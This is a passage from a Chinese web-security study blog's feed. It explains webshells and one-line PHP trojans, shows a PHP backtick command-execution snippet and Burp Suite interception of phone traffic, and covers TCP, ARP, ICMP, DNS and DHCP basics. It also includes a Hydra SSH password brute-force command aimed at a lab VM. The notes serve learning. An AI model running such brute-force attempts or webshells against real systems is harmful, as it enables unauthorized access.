class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> `ipconfig`;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/ref.exec.php" target="_blank" rel="noopener">更多函数</a></p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>shell 是系统的用户界面，提供了用户与内核进行交互操作的一种接口。</p><h4 id="什么是-webshell"><a href="#什么是-webshell" class="headerlink" title="什么是 webshell"></a>什么是 webshell</h4><p>黑客在入侵了一个网站后，通常会留下一个 asp、aspx、jsp、php 等脚本后门文件与网站 web 服务器进行交互，得到了一个命令执行环境，以达到控制网站服务器的目的，这个后门文件就是所谓的 webshell。</p><h4 id="一句话木马介绍"><a href="#一句话木马介绍" class="headerlink" title="一句话木马介绍"></a>一句话木马介绍</h4><p>一句话木马是 webshell 的一种，由与这类 webshell 代码比较少，往往只有一行代码，所以就被称为一句话木马。</p><p>一句话木马虽然代码简单，但结合中国菜刀等 webshell 管理工具，它们的功能确实非常强大的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="webshell" scheme="http://yoursite.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>note30</title>
    <link href="http://yoursite.com/2019/08/24/note30/"/>
    <id>http://yoursite.com/2019/08/24/note30/</id>
    <published>2019-08-24T05:47:18.000Z</published>
    <updated>2019-08-24T08:11:44.728Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 使用 <code>burpsuite</code> 抓取手机数据包，以及本周疑难点总结</p><a id="more"></a><!--export--><!--toc--><h3 id="利用burpsuite抓取手机数据包"><a href="#利用burpsuite抓取手机数据包" class="headerlink" title="利用burpsuite抓取手机数据包"></a>利用burpsuite抓取手机数据包</h3><h4 id="手机和电脑连接同一网络"><a href="#手机和电脑连接同一网络" class="headerlink" title="手机和电脑连接同一网络"></a>手机和电脑连接同一网络</h4><p>查看电脑 <code>IP</code> </p><p><img src="/images/83ip.png" alt> </p><h4 id="配置burpsuite和手机代理"><a href="#配置burpsuite和手机代理" class="headerlink" title="配置burpsuite和手机代理"></a>配置burpsuite和手机代理</h4><p><strong>burpsuite</strong>:</p><p><img src="/images/84bpTel3.png" alt></p><p>在 <code>Proxy</code> 中选择 <code>Options</code> 点击 <code>Add</code>，绑定端口填入 <code>8080</code> ，<code>Specific address</code>选择第一步查看到的 <code>IP</code>，配置完后点击 <code>Import/export CA certificate</code>。</p><p><strong>手机代理</strong>：</p><p>长按连接的 <code>wifi</code>，选择显示高级选项，代理选择 <code>手动</code> ，主机名填写 第一步的 <code>IP</code>，端口号 <code>8080</code>，<code>IP</code> 设置选择 <code>DHCP</code> </p><h4 id="下载证书并导入手机"><a href="#下载证书并导入手机" class="headerlink" title="下载证书并导入手机"></a>下载证书并导入手机</h4><p>打开手机浏览器，输入第一步的 <code>IP</code> 地址和端口号，会进入 <code>burpsuite</code> 证书下载界面，点击证书选择下载，若下载的是 <code>.cer</code>直接安装就好，若为 <code>.der</code>重命名为 <code>.cer</code>，点击安装后，证书名称输入 <code>CA</code>，凭据用途选择 <code>WLAN</code> 完成后就可以用 <code>burpsuite</code> 抓取手机数据包了。</p><p>在手机打开搜狐新闻抓取数据包如下：</p><p><img src="/images/85bpTel2.png" alt>  </p><p><img src="/images/86bpTel.png" alt></p><p>可以从 <code>User-Agent</code>看出手机型号。</p><h3 id="为什么三次握手？"><a href="#为什么三次握手？" class="headerlink" title="为什么三次握手？"></a>为什么三次握手？</h3><p>三次握手的作用是：通信双方能明确自己的收发以及对方的收发是正常的。</p><h4 id="第一次握手"><a href="#第一次握手" class="headerlink" title="第一次握手"></a>第一次握手</h4><p>客户端给服务端发送网络包，服务端接收到了数据包。对于服务端来说可以有以下结论：客户端的发送功能以及服务端的接收功能是正常的；对于客户端来说，无法得出结论。</p><h4 id="第二次握手"><a href="#第二次握手" class="headerlink" title="第二次握手"></a>第二次握手</h4><p>服务端发包，客户端接收。客户端接收包，对于客户端来说，首先接收到了包，说明第一次发送成功了，说明自己的收发没有问题，其次，也可以得出服务端的收发是没有问题的。即经过第二次握手后，客户端已经明确自己和对方的收发功能是否正常了。但，服务端目前还不能判断自己的发送和客户端的接收是否正常。</p><h4 id="第三次握手"><a href="#第三次握手" class="headerlink" title="第三次握手"></a>第三次握手</h4><p>客户端发包，服务端接收。前两次握手后，服务端无法明确客户端的接收和自己的发送能力是否正常。而第三次握手后，服务端收到了客户端对第二次握手作回应，对服务端来说，第二次握手响应数据发出后，客户端接收到了。所以我的发送能力是正常的，而客户端的接收能力也是正常的。</p><table><thead><tr><th>握手次数</th><th>客户端</th><th>服务端</th></tr></thead><tbody><tr><td>第一次</td><td>发数据</td><td>客户端发送能力正常，服务端的接收能力正常</td></tr><tr><td>第二次</td><td>客户端收发正常，服务端的收发正常</td><td>发数据</td></tr><tr><td>第三次</td><td>发数据</td><td>客户端收发正常，服务端收发正常</td></tr></tbody></table><p><em>参考文献</em></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/53374516" target="_blank" rel="noopener">“三次握手，四次挥手”你真的懂吗？</a></p></blockquote><h3 id="为什么建立连接是三次握手，而关闭连接却是四次挥手？"><a href="#为什么建立连接是三次握手，而关闭连接却是四次挥手？" class="headerlink" title="为什么建立连接是三次握手，而关闭连接却是四次挥手？"></a>为什么建立连接是三次握手，而关闭连接却是四次挥手？</h3><p>服务端在 <code>LISTEN</code> 状态下，收到建立连接请求的 <code>SYN</code> 报文后，把 <code>ACK</code> 和 <code>SYN</code> 放在一个报文里发送给客户端。而关闭连接时，当收到对方的 <code>FIN</code> 报文时，仅仅表示对方不再发送数据了，但还是可以接收数据 ，己方是否现在关闭发送通道，需要上层应用来决定，因此，己方的 <code>ACK</code> 和 <code>FIN</code> 一般都会分开发送。</p><p><img src="/images/87fourbai.gif" alt></p><p><em>参考文献</em></p><blockquote><p><a href="https://blog.csdn.net/qzcsu/article/details/72861891" target="_blank" rel="noopener">图片来源</a></p><p><a href="https://zhuanlan.zhihu.com/p/53374516" target="_blank" rel="noopener">“三次握手，四次挥手”你真的懂吗？</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 使用 &lt;code&gt;burpsuite&lt;/code&gt; 抓取手机数据包，以及本周疑难点总结&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="burpsuite" scheme="http://yoursite.com/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>note29</title>
    <link href="http://yoursite.com/2019/08/23/note29/"/>
    <id>http://yoursite.com/2019/08/23/note29/</id>
    <published>2019-08-23T10:51:36.000Z</published>
    <updated>2019-08-23T12:28:26.424Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 学习网络层数据包的结构， <code>ARP</code> 协议、<code>IP</code> 协议和 <code>ICMP</code> 协议以及 <code>wireshark</code> 获取网络层的数据包。</p><a id="more"></a><!--export--><!--toc--><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><h4 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h4><ul><li>熟悉网络层数据包结构</li><li>熟悉<code>ARP</code> 协议、<code>IP</code> 协议、<code>ICMP</code> 协议</li><li>能够看懂 <code>wireshark</code>获取到的网络层数据包 </li></ul><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h4><h5 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h5><p><code>ARP</code>: <code>Address Resolution Protocol</code> 协议，即地址解析协议，把网络层的 <code>IP</code> 地址翻译成在数据链路层寻址的48位硬件地址（<code>MAC</code>地址）。</p><p>在 <code>OSI</code> 模型中 <code>ARP</code> 协议属于链路层；在 <code>TCP/IP</code> 模型中，<code>ARP</code> 协议属于网络层。</p><h5 id="ARP协议工作流程"><a href="#ARP协议工作流程" class="headerlink" title="ARP协议工作流程"></a>ARP协议工作流程</h5><p><strong>第一步</strong>：在每台主机都设有一个 <code>ARP</code> 高速缓存，保存局域网上各主机和路由 <code>IP</code> 地址到硬件地址的映射表。当 <code>A</code>主机向 <code>B</code>主机发送一个数据包时，<code>A</code> 主机先在其高速缓存中查看有无 <code>B</code> 的 <code>IP</code> 地址对应的 <code>MAC</code>地址，如果有把硬件地址写入到数据包。</p><p><strong>第二步</strong>：若没有找到，<code>APR</code> 进程在局域网上广播发送一个 <code>ARP</code> 请求分组，数据包的主要内容是：“我的 <code>IP</code> 值是<code>1.1.1.1</code>，硬件地址是 <code>xx-xx-xx-xx-xx-xx-xx-xx</code>。我想知道<code>IP</code>地址为 <code>2.2.2.2</code> 的主机硬件地址”，局域网上所有主机上都会收到这个 <code>ARP</code> 请求分组。</p><p><strong>第三步</strong>：主机 <code>B</code> 收到了主机 <code>A</code> 发送的 <code>ARP</code> 请求分组数据包，发现请求的 <code>IP</code> 和自己的 <code>IP</code> 一样，就收下这个 <code>IP</code>，并向主机<code>A</code>发送 <code>ARP</code> 响应分组，同时把数据包带有 <code>A</code> 的硬件地址写入自己的 <code>ARP</code> 缓存表。其余所有的主机因为 <code>IP</code> 不匹配都不会理会这个请求数据包。响应包的主要内容是：“我的 <code>IP</code> 地址是 <code>2.2.2.2</code>，我的硬件地址是 <code>yy-yy-yy-yy-yy-yy-yy-yy</code>”，单独发送给 <code>A</code>，不会广播。</p><p><strong>Note</strong>: <code>ARP</code> 对保存在高速缓存中的每一个映射地址都设置生存时间，超过生存时间就会从缓存表中删除，防止对方硬件地址突然失效，比如拔下网线，更换网卡；当硬件地址发生变化，主机会发送一个无偿的 <code>ARP</code> 数据包，广播给局域网内所有鸡器。</p><h4 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h4><p><code>IP</code> 在 <code>ARP</code> 的上层，<code>ICMP</code> 和 <code>IGMP</code>在 <code>IP</code> 的上层。</p><p><img src="/images/78ip.png" alt></p><p><img src="/images/79ipprotocol.png" alt></p><h4 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h4><h5 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h5><p><code>ICMP</code>: <code>Internet Control Message Protocol</code> ，即网际报文控制协议。用于在<code>IP</code> 主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。大部分网络检修技巧和工具都是基于<code>ICMP</code>的。简单点说，<code>ICMP</code>常用于寻找网络故障。</p><h5 id="tracert工作原理"><a href="#tracert工作原理" class="headerlink" title="tracert工作原理"></a>tracert工作原理</h5><p><code>tracert</code> 从源主机向目的主机发送一连串 <code>ICMP</code> 数据包。第一个数据包 <code>P1</code> 的生存时间 <code>TTL=1</code>，当 <code>P1</code> 数据包到达路径上第一个路由器 <code>R1</code> 时候，路由器把 <code>TTL</code> 减一，然后发现 <code>TTL=0</code>，<code>R1</code>就丢弃 <code>P1</code>，然后发送一个 <code>ICMP</code>时间超过差错报文。下一个数据包 <code>TTL=2</code>，到第二个路由器 <code>R2</code>被丢弃，以此类推。</p><p>当 <code>TTL</code> 等于某一个数值时候，刚好到达目的主机，目的主机就返回一个正常的响应包，告诉源主机已经到达目的主机。</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>在网络中进行通信的实体是主机中的进程，网络层为主机之间提供逻辑通信，而传输层为应用进程之间提供端到端的逻辑通信。传输层还要对报文进行差错检测，提供可靠的运输。但在网络层，<code>IP</code> 数据包检测只针对首部，不检查数据部分。</p><p>传输层的两个主要协议：</p><pre><code>* 传输控制协议 `TCP` (`Transmission Control Protocol`)* 用户数据包协议`UDP` (`User Datagram Protocol`)</code></pre><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><ol><li><code>TCP</code> 提供面向连接的服务。在传送数据前必须先建立会话，进行流量控制，保证可靠传输。</li><li><code>UDP</code> 传输之间不需要建立连接，不提供可靠交付，简单点说就是发送出去就不管了。适合一个数据包就能完成通信，或者对丢包了没必要重传的应用。</li></ol><p><img src="/images/80tcpudp.png" alt></p><h4 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h4><h5 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h5><p><img src="/images/81threehands.png" alt></p><ol><li>客户端发送 <code>SYN</code> 段，并指明客户端的初始化序列号，即 <code>ISN(s)</code></li><li>服务端发送自己的 <code>SYN</code>段作为应答，同样指明自己的 <code>ISN(s)</code> 。为了确认客户端的 <code>SYN</code>，将 <code>ISN(c)+1</code> 作为 <code>ACK</code> 数值。这样，每发送一个 <code>SYN</code>，序列号就会加1。如果有丢失情况，则会重传。</li><li>为了确认服务器端的 <code>SYN</code>，客户端将 <code>SYN(s)+1</code>作为返回的 <code>ACK</code>数值。</li></ol><h5 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h5><p><img src="/images/82foursaybai.png" alt></p><ol><li>客户端发送一个 <code>FIN</code> 段，并包含一个希望接受这看到的自己当前的序列号 <code>K</code>，同时还包含一个 <code>ACK</code> 表示确认对方最近一次发过来的数据。</li><li>服务端将 <code>K</code>值加1作为 <code>ACK</code> 序号值，表明收到了上一个包。这是上层应用程序会被告知另一端发起了关闭操作，通常将这引起应用程序发起自己的关闭。</li><li>服务端发起自己的 <code>FIN</code> 段， <code>ACK=K+1</code>，<code>Seq=L</code> 。</li><li>客户端确认，<code>ACK=L+1</code></li></ol><h4 id="DNS域名解析"><a href="#DNS域名解析" class="headerlink" title="DNS域名解析"></a>DNS域名解析</h4><h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><ol><li>浏览器输入 <code>www.xxx.com</code> 域名，操作系统会检查自己本地的 <code>hosts</code> 文件是否有这个映射关系，若有，就先调用这个 <code>IP</code> 地址映射，完成域名解析。</li><li>若 <code>hosts</code> 没有这个域名映射，则查找本地 <code>DNS</code> 解析器缓存，是否有这个网址映射关系，若有直接返回，完成域名解析。</li><li>若 <code>hosts</code> 与本地 <code>DNS</code> 解析器缓存都没有相应的网址映射关系，首先会找 <code>TCP/IP</code> 参数设置的首选 <code>DNS</code> 服务器，即本地 <code>DNS</code> 服务器，此服务器收到查询时，若要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析。</li><li>若本地 <code>DNS</code> 服务器解析失败，则到根 <code>DNS</code> 解析器请求。</li></ol><h4 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h4><p><code>DHCP</code>: <code>Dynamic Host Configuration Protocol</code>，即动态主机配置协议，是一个应用层协议，工作在局域网，使用 <code>UDP</code> 协议，能够让设备自动获取重要网络资源，本质就是在 <code>DHCP</code> 服务器上有一个数据库，存放着 <code>IP</code>地址、网关、<code>DNS</code>等参数。</p><h5 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h5><ol><li>自动分配方式：<code>DHCP</code>给主机指定一个永久的 <code>IP</code> 地址，一旦 <code>DHCP</code> 客户端第一次成功的从 <code>DHCP</code> 服务器租用到 <code>IP</code>位址后，就永远使用这个位址。</li><li>动态分配方式：<code>DHCP</code> 给主机指定一个有”时间限制”的 <code>IP</code> 地址，到时间或主机明确表示放弃这个地址时，这个地址可以被其他主机使用，当然，客户端可以比其他主机更优先延续租用。</li><li>手动分配方式：主机 <code>IP</code> 地址由网络管理员指定，它可以按照 <code>MAC</code>地址固定分配 <code>IP</code> 位址，<code>DHCP</code> 只是把指定的 <code>IP</code> 地址告诉主机，相当于将某个 <code>MAC</code> 和 <code>IP</code> 进行了静态绑定。</li></ol><h5 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h5><ol><li>新机器加入网络时，会使用 <code>0.0.0.0</code> 作为源地址，发送广播<code>discover</code>报文，查询网络上有哪些 <code>DHCP server</code> </li><li><code>DHCP</code> 服务器接收到 <code>DHCP Discover</code> 报文后，回应 <code>Offer</code> 报文，提供 <code>IP</code> 地址给请求方</li><li>请求方根据收到的 <code>Offer</code> 报文，选择一个 <code>DHCP server</code> ，并选择它提供的 <code>IP</code> 地址，然后广播 <code>Request</code> 报文，向 <code>DHCP Server</code> 请求该 <code>IP</code> 地址，同时想本地网络公告自己已经选择了某个 <code>DHCP Server</code> 的某个 <code>IP</code> 地址</li><li><code>DHCP Server</code> 回应 <code>ACK</code> 报文，将 <code>IP</code> 地址分配给 <code>Client</code> 端</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 学习网络层数据包的结构， &lt;code&gt;ARP&lt;/code&gt; 协议、&lt;code&gt;IP&lt;/code&gt; 协议和 &lt;code&gt;ICMP&lt;/code&gt; 协议以及 &lt;code&gt;wireshark&lt;/code&gt; 获取网络层的数据包。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>note28</title>
    <link href="http://yoursite.com/2019/08/22/note28/"/>
    <id>http://yoursite.com/2019/08/22/note28/</id>
    <published>2019-08-22T12:11:37.000Z</published>
    <updated>2019-08-22T12:41:44.698Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>hadra</code> 的使用及计算机网络基础</p><a id="more"></a><!--export--><!--toc--><h3 id="Hadra的使用"><a href="#Hadra的使用" class="headerlink" title="Hadra的使用"></a>Hadra的使用</h3><table><thead><tr><th>参数</th><th>用法</th></tr></thead><tbody><tr><td>-l LOGIN</td><td>指定破解的用户，对特定用户破解</td></tr><tr><td>-L FILE</td><td>指定用户名字典</td></tr><tr><td>-p PASS</td><td>小写，指定密码破解</td></tr><tr><td>-P FILE</td><td>大写，指定密码字典</td></tr><tr><td>-M FILE</td><td>指定目标列表文件一行一条</td></tr><tr><td>-t TASKS</td><td>同时运行的线程数</td></tr></tbody></table><p>实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l username -P password.txt -t 6 ssh://ip</span><br></pre></td></tr></table></figure><p>在物理机上用 <code>ssh</code> 连接 <code>VM</code> 的 <code>CentOS</code> ，</p><p><img src="/images/73powershell.png" alt> </p><p>然后在 <code>Kali</code> 用 <code>hydra</code> 破解密码。</p><p><img src="/images/74hydra.png" alt></p><h3 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h3><h4 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h4><ul><li>了解常见的网络设备</li><li>了解三种网络模型</li><li>了解互联网中数据传输方式</li><li>深入理解网络层协议</li><li>深入理解运输层协议</li><li>深入理解应用层协议</li></ul><h4 id="认识网络设备"><a href="#认识网络设备" class="headerlink" title="认识网络设备"></a>认识网络设备</h4><p>网卡：允许计算机在计算机网络上进行通讯的计算机硬件，拥有 <code>MAC</code> 地址，属于 <code>OSI</code> 模型第一层。</p><p><strong>修改 <code>MAC</code>地址</strong>： 设备管理器 → 网络适配器 → 选择网卡 → 网络连接 → 修改</p><p>集线器：工作与 <code>OSI</code> 模型第一层，属于纯硬件网络底层设备，发送数据没有针对性，采用广播方式发送。</p><p>交换机：工作与 <code>OSI</code> 模型第二层，具有”智能记忆“能力和”学习“能力，使用 <code>MAC</code> 来寻址。</p><p>路由器：连接两个或多个网络的硬件设备，在网络间起网卡的作用，运行在 <code>OSI</code> 模型第三层，使用 <code>IP</code> 地址来通信。</p><h4 id="OSI网络分层"><a href="#OSI网络分层" class="headerlink" title="OSI网络分层"></a>OSI网络分层</h4><p>参见<a href="https://meethanmj.github.io/2019/08/20/note26/" target="_blank" rel="noopener">note26</a></p><h4 id="数据传输过程"><a href="#数据传输过程" class="headerlink" title="数据传输过程"></a>数据传输过程</h4><p><img src="/images/77data_how_to_tran.png" alt></p><h4 id="数据封装过程"><a href="#数据封装过程" class="headerlink" title="数据封装过程"></a>数据封装过程</h4><p><img src="/images/75package.png" alt></p><h4 id="数据解封过程"><a href="#数据解封过程" class="headerlink" title="数据解封过程"></a>数据解封过程</h4><p><img src="/images/76unpackage.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: &lt;code&gt;hadra&lt;/code&gt; 的使用及计算机网络基础&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
</feed>
